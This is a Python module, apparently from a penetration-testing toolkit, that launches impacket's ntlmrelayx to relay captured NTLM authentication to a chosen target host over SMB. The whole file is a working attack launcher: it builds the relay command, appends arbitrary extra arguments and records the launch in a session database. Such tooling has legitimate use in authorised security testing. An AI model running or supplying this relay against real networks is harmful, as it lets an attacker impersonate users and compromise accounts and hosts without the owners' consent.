
# scripts/smb/attack/ntlm_relay.py
"""
NTLM relay setup helper.
Launches impacket ntlmrelayx.py targeting the specified host.
Lobera acts as a launcher/wrapper, not as the relay itself.
"""
import subprocess
import shutil
from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript


class Script(BaseScript):
    name        = "ntlm-relay"
    protocol    = "smb"
    category    = "attack"
    description = (
        "Launch ntlmrelayx (impacket) to relay captured NTLM auth to a target. "
        "Requires ntlmrelayx.py in PATH and SMB signing disabled on target."
    )

    def run(self, **kwargs):
        ip          = self.target.ip
        relay_target= str(kwargs.get("relay_target", ip))
        mode        = str(kwargs.get("mode", "smb"))
        extra_args  = str(kwargs.get("extra_args", ""))

        ntlmrelayx = shutil.which("ntlmrelayx.py") or shutil.which("ntlmrelayx")
        if not ntlmrelayx:
            console.print("[red]ntlmrelayx.py not found in PATH.[/red]")
            console.print("[dim]Install impacket: pip install impacket[/dim]")
            return None

        cmd = [ntlmrelayx, "-t", f"{mode}://{relay_target}", "-smb2support"]
        if extra_args:
            cmd += extra_args.split()

        console.print(f"\n[bold green]Launching:[/bold green] {' '.join(cmd)}")
        console.print("[dim]Press Ctrl+C to stop the relay.[/dim]\n")

        session_db.DB.SaveFinding(ip, "SMB", "ntlm_relay_launched",
                                   f"relay_target={relay_target} mode={mode}")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            console.print("\n[dim]Relay stopped.[/dim]")
        except Exception as e:
            print_result("SMB", ip, "fail", f"ntlmrelayx failed: {e}")
            return None
        return True
